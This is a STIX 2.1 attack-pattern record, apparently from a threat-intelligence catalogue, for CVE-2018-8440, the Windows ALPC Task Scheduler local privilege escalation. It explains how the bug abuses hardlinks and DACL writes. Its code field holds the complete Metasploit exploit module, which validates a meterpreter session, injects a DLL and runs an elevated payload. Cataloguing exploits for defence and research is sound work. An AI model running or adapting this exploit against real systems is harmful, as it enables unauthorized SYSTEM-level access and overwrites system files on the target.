{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--64b45d20-3f92-4823-8add-76de91cb8da4",
    "created": "2024-08-14T16:49:17.407973Z",
    "modified": "2024-08-14T16:49:17.407977Z",
    "name": "Microsoft Windows ALPC Task Scheduler Local Privilege Elevation",
    "description": " On vulnerable versions of Windows the alpc endpoint method SchRpcSetSecurity implemented by the task scheduler service can be used to write arbitrary DACLs to `.job` files located in `c:\\windows\\tasks` because the scheduler does not use impersonation when checking this location. Since users can create files in the `c:\\windows\\tasks` folder, a hardlink can be created to a file the user has read access to. After creating a hardlink, the vulnerability can be triggered to set the DACL on the linked file.  WARNING: The PrintConfig.dll (%windir%\\system32\\driverstor\\filerepository\\prnms003*) on the target host will be overwritten when the exploit runs.  This module has been tested against Windows 10 Pro x64.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/alpc_taskscheduler.rb",
            "external_id": "alpc_taskscheduler.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8440"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/SandboxEscaper/randomrepo/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Windows ALPC Task Scheduler Local Privilege Elevation',\n        'Description' => %q{\n          On vulnerable versions of Windows the alpc endpoint method SchRpcSetSecurity implemented\n          by the task scheduler service can be used to write arbitrary DACLs to `.job` files located\n          in `c:\\windows\\tasks` because the scheduler does not use impersonation when checking this\n          location. Since users can create files in the `c:\\windows\\tasks` folder, a hardlink can be\n          created to a file the user has read access to. After creating a hardlink, the vulnerability\n          can be triggered to set the DACL on the linked file.\n\n          WARNING:\n          The PrintConfig.dll (%windir%\\system32\\driverstor\\filerepository\\prnms003*) on the target host\n          will be overwritten when the exploit runs.\n\n          This module has been tested against Windows 10 Pro x64.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'SandboxEscaper', # Original discovery and PoC\n          'bwatters-r7',          # msf module\n          'asoto-r7',             # msf module\n          'Jacob Robles'          # msf module\n        ],\n        'Platform' => 'win',\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Windows 10 x64', { 'Arch' => ARCH_X64 }]\n        ],\n        'References' => [\n          ['CVE', '2018-8440'],\n          ['URL', 'https://github.com/SandboxEscaper/randomrepo/'],\n        ],\n        'Notes' => {\n          # Exploit overwrites PrintConfig.dll, which makes it unusable.\n          'Stability' => [ OS_RESOURCE_LOSS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'DisclosureDate' => '2018-08-27',\n        'DefaultTarget' => 0\n      )\n    )\n  end\n\n  def validate_active_host\n    sysinfo['Computer']\n    true\n  rescue Rex::Post::Meterpreter::RequestError, Rex::TimeoutError => e\n    elog(e)\n    false\n  end\n\n  def validate_target\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X86\n      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')\n    end\n\n    version = get_version_info\n    if version.xp_or_2003? && version.workstation?\n      fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP')\n    end\n  end\n\n  def exploit\n    unless session.type == 'meterpreter'\n      fail_with(Failure::None, 'Only meterpreter sessions are supported')\n    end\n\n    print_status('Checking target...')\n    unless validate_active_host\n      raise Msf::Exploit::Failed, 'Could not connect to session'\n    end\n\n    validate_target\n\n    print_status('Target looks good... attempting the LPE exploit')\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-8440', 'ALPC-TaskSched-LPE.dll'),\n      generate_payload_dll\n    )\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  rescue Rex::Post::Meterpreter::RequestError => e\n    elog(e)\n    print_error(e.message)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-08-27",
    "x_mitre_platforms": [
        "win'"
    ]
}